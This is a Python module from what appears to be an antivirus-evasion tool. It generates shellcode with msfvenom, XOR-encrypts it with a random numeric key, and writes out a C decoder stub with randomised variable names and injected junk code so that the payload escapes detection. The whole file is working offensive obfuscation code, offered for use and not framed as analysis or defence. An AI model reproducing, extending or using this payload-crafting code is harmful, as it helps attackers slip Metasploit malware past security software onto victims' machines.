from lib import core, junk
from subprocess import run, PIPE
from re import findall
from random import randrange
from random import choice
from string import digits


def shellcode_generation(msfvenom, junkcode, intensity):
    shellcode = run(msfvenom, shell=False, stdout=PIPE).stdout.decode('utf-8')
    core.shellcode_generated()
    vShellcode, decoder_stub = xor_encryption(shellcode, junkcode, intensity)
    core.shellcode_encrypted()
    return vShellcode, decoder_stub


def xor_encryption(shellcode, junkcode, intensity):
    final_stub = findall('\\\\x([a-f0-9][a-f0-9])', shellcode)
    shellcode_len = len(final_stub)
    keylen = randrange(64, 128)
    password = ''.join(choice(digits) for i in range(keylen))

    vShellcode = core.varname_creator()
    vShellcodelen = core.varname_creator()
    vEshellcode = core.varname_creator()
    vPassword = core.varname_creator()
    vPasswordlen = core.varname_creator()

    # Variables
    final_stub = '\nint enc_shellcode[] = { ' + ', '.join([str(int(code, 16) ^ ord(password[(i % len(password))])) for i, code in enumerate(final_stub)]) + ' };\n'
    final_stub += junk.junk_inject(junkcode, "code", intensity)
    final_stub = final_stub.replace("enc_shellcode", vEshellcode)
    final_stub += 'int ' + vShellcodelen + f' = {shellcode_len};\n'
    final_stub += junk.junk_inject(junkcode, "code", intensity)
    final_stub += 'char ' + vPassword + f'[] = "{password}";\n'
    final_stub += junk.junk_inject(junkcode, "code", intensity)
    final_stub += 'int ' + vPasswordlen + f'= {len(password)};\n'
    final_stub += junk.junk_inject(junkcode, "code", intensity)

    # Decoder stub
    final_stub += "unsigned char " + vShellcode + "[" + vShellcodelen + "];\n"
    final_stub += junk.junk_inject(junkcode, "code", intensity)
    final_stub += "for(int i = 0; i < " + vShellcodelen + "; i++) {\n"
    final_stub += junk.junk_inject(junkcode, "code", intensity)
    final_stub += vShellcode + "[i] = (char) " + vEshellcode + "[i] ^ " + vPassword + "[i % " + vPasswordlen + "];\n}\n"
    final_stub += junk.junk_inject(junkcode, "code", intensity)

    return vShellcode, final_stub
